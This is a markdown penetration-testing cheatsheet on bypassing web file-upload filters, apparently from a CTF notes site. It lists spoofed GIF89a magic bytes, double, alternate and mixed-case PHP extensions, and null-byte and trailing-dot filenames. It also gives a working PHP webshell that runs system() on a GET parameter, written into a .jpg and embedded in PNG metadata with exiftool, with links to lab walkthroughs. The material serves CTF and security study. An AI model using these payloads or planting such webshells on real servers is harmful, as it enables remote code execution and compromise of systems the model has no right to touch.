---
title: Cheatsheet - Upload Bypass
categories: [Cheatsheet, Web]
tags: [cheatsheet/web, exploit/file-upload-bypass]
img_path: /Cheatsheet/Web/Upload bypass/images
---


# Magic Bytes; header
![](Pasted%20image%2020220415215405.png)
- if uploaded content is being scanned, sometimes the check can be fooled by putting this header item at the top of shellcode:
	```
	GIF89a;
	```
- Some Examples:
	- [Vulnhub PwnLab - Bypass upload](https://youtu.be/Q85ku046Q_E?t=1210)
	- [HackTheBox Networked - Bypass upload](https://yufongg.github.io/posts/Networked/#tcp80-http---file-upload-bypass)

# Append the allowed extension
- If only `.png` allowed, try appending `.png` at the end
- Try both ways
	```
	.php.png
	.png.php
	```
	- Some Examples:
		- [Vulnhub Fristileaks 1.3 - Upload bypass via appending](https://youtu.be/jPW_0BFxAYU?t=658)

# Other PHP Extensions
```
php1
php2
php3
php4
php5
phptml
```
- Some Examples
	- [TryHackMe RootMe - Upload bypass via other PHP ext](https://youtu.be/7ZgZv6yJtjM?t=315)
	- [TryHackMe Vulnveristy - Upload bypass via other PHP ext](https://youtu.be/VoY2ERH08Bs?t=564)

# Case Sensitive Extensions
```
shell.pHP
shell.PhP
shell.pHP4
shell.PhPtml
shell.phP5
```


# Insert .jpg webshell
- Requires LFI to work
	```
	cat > bingchilling.jpg <<EOF
	<html>
	<body>
	<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
	<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
	<input type="SUBMIT" value="Execute">
	</form>
	<pre>
	<?php
		if(isset($_GET['cmd']))
		{
			system($_GET['cmd']);
		}
	?>
	</pre>
	</body>
	</html>
	EOF
	```
	```
	<?php system($_GET['cmd']); ?>  //shell.php
	exiftool "-comment<=shell.php" malicious.png
	strings malicious.png | grep system
	```
- Some Examples:
	- TryHackMe HackerOne Easy Port 8001

# Nullbyte
```
shell.jpeg%00.php
shell.png%00.php
```

# Trailing (Windows)
- Adding `.` to the end
	```
	shell.aspx.
	shell.php.
	shell.exe.
	```
	
# Exiftool:
- If web application is accepting uploaded files which are passed to exiftool, can, in turn lead to RCE.
- https://hackerone.com/reports/1154542

# RCE via filename
![](Pasted%20image%2020220415215647.png)

# Use burpsuite to find bypass
![](uploadBypass php extension.png)
![](uploadBypass payloads.png)
![](uploadBypass position.png)
![](uploadBypass Results.png)

# Sources:
https://www.onsecurity.io/blog/file-upload-checklist/

